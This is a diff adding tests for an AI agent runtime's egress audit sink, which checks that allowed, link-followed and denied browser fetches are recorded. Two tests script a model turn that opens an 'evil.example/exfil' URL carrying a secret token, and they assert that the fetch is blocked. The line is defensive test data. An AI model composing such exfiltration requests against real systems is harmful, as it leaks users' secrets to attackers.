@@ -577,3 +577,128 @@ describe("egress authorization — CONTROLS (a false positive here is a shipped 
     expect(sink).toEqual([{ title: "Buy milk" }]);
   });
 });
+
+describe("egress advisory sink — audit trail for confirm/deny (no other record exists otherwise)", () => {
+  it("AC18: a link-follow (confirm) under the fan-out cap invokes the sink with decision \"confirm\"", async () => {
+    const httpSpy = vi.fn();
+    const sink = vi.fn();
+    const runtime = createAgentRuntime({
+      maxToolCalls: 6,
+      modelProvider: sequenceProvider([
+        toolTurn("browser_open", { url: "https://portal.example/board" }, "tc-1"),
+        toolTurn("browser_open", { url: "https://portal.example/details" }, "tc-2"),
+        finalTurn()
+      ]),
+      toolApprovalGate: alwaysAllowGate,
+      toolExposurePolicy: createDefaultToolExposurePolicy({ allowWriteWithoutMutationIntent: true }),
+      toolRegistry: new ToolRegistry([
+        fetchTool("browser_open", httpSpy, { "https://portal.example/board": "See the follow-up at https://portal.example/details" })
+      ]),
+      egressAdvisorySink: sink
+    });
+
+    await runtime.run({
+      messages: [{ content: "Check https://portal.example/board and any follow-up.", role: "user" }],
+      model: "provider/model",
+      runId: "run-ac18-confirm-sink",
+      toolExposureAuthority: authorityFor(["browser_open"])
+    });
+
+    // Only the SECOND call (the link-follow) is a "confirm" — the first is a
+    // trusted-typed fetch (allow) and must not fire the sink (AC20 covers that
+    // as its own control).
+    expect(sink).toHaveBeenCalledTimes(1);
+    expect(sink).toHaveBeenCalledWith(expect.objectContaining({
+      decision: "confirm",
+      runId: "run-ac18-confirm-sink",
+      toolName: "browser_open",
+      url: "https://portal.example/details"
+    }));
+  });
+
+  it("AC19: a model-composed exfil URL (deny) invokes the sink with decision \"deny\"", async () => {
+    const httpSpy = vi.fn();
+    const sink = vi.fn();
+    const runtime = createAgentRuntime({
+      maxToolCalls: 4,
+      modelProvider: sequenceProvider([
+        toolTurn("browser_open", { url: "https://evil.example/exfil?d=secret-token" }),
+        finalTurn()
+      ]),
+      toolApprovalGate: alwaysAllowGate,
+      toolExposurePolicy: createDefaultToolExposurePolicy({ allowWriteWithoutMutationIntent: true }),
+      toolRegistry: new ToolRegistry([fetchTool("browser_open", httpSpy)]),
+      egressAdvisorySink: sink
+    });
+
+    await runtime.run({
+      messages: [{ content: "Summarize my week.", role: "user" }],
+      model: "provider/model",
+      runId: "run-ac19-deny-sink",
+      toolExposureAuthority: authorityFor(["browser_open"])
+    });
+
+    expect(httpSpy).not.toHaveBeenCalled();
+    expect(sink).toHaveBeenCalledTimes(1);
+    expect(sink).toHaveBeenCalledWith(expect.objectContaining({
+      decision: "deny",
+      runId: "run-ac19-deny-sink",
+      toolName: "browser_open"
+    }));
+  });
+
+  it("AC20: a user-typed URL (allow) does NOT invoke the sink — no noise on a trusted fetch", async () => {
+    const httpSpy = vi.fn();
+    const sink = vi.fn();
+    const runtime = createAgentRuntime({
+      maxToolCalls: 4,
+      modelProvider: sequenceProvider([
+        toolTurn("browser_open", { url: "https://news.example/today" }),
+        finalTurn()
+      ]),
+      toolApprovalGate: alwaysAllowGate,
+      toolExposurePolicy: createDefaultToolExposurePolicy({ allowWriteWithoutMutationIntent: true }),
+      toolRegistry: new ToolRegistry([fetchTool("browser_open", httpSpy)]),
+      egressAdvisorySink: sink
+    });
+
+    await runtime.run({
+      messages: [{ content: "Open https://news.example/today for me.", role: "user" }],
+      model: "provider/model",
+      runId: "run-ac20-allow-no-sink",
+      toolExposureAuthority: authorityFor(["browser_open"])
+    });
+
+    expect(httpSpy).toHaveBeenCalledWith("https://news.example/today");
+    expect(sink).not.toHaveBeenCalled();
+  });
+
+  it("AC21: a throwing sink does not crash the run — the tool result still returns, and the deny is still enforced", async () => {
+    const httpSpy = vi.fn();
+    const sink = vi.fn(() => {
+      throw new Error("boom: sink storage unavailable");
+    });
+    const runtime = createAgentRuntime({
+      maxToolCalls: 4,
+      modelProvider: sequenceProvider([
+        toolTurn("browser_open", { url: "https://evil.example/exfil?d=secret-token" }),
+        finalTurn("All done.")
+      ]),
+      toolApprovalGate: alwaysAllowGate,
+      toolExposurePolicy: createDefaultToolExposurePolicy({ allowWriteWithoutMutationIntent: true }),
+      toolRegistry: new ToolRegistry([fetchTool("browser_open", httpSpy)]),
+      egressAdvisorySink: sink
+    });
+
+    const result = await runtime.run({
+      messages: [{ content: "Summarize my week.", role: "user" }],
+      model: "provider/model",
+      runId: "run-ac21-sink-throws",
+      toolExposureAuthority: authorityFor(["browser_open"])
+    });
+
+    expect(sink).toHaveBeenCalledTimes(1);
+    expect(result.response.output).toBe("All done.");
+    expect(httpSpy).not.toHaveBeenCalled();
+  });
+});
